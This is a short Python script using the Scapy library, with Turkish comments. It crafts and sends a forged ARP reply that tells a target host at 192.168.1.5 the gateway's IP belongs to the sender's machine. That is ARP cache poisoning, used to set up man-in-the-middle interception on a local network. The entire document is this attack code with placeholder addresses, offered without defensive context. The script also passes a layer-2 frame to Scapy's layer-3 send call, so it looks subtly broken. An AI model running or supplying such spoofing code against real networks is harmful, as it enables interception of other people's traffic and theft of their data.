from scapy.all import ARP, Ether, send

# Hedef IP adresi ve geçiş IP'si
target_ip = "192.168.1.5"  # Hedef cihazın IP adresi
gateway_ip = "192.168.1.1"  # Ağ geçidinin IP adresi

# Hedef cihazın MAC adresini öğrenin
target_mac = "00:11:22:33:44:55"  # Hedef cihazın MAC adresi

# Ağ geçidinin MAC adresini öğrenin
gateway_mac = "66:77:88:99:00:11"  # Ağ geçidinin MAC adresi

# ARP paketini oluşturun ve gönderin
# Bu paket, hedef cihazı ağ geçidine yönlendirecek
arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
ether_response = Ether(dst=target_mac) / arp_response

# Paketi gönder
send(ether_response)
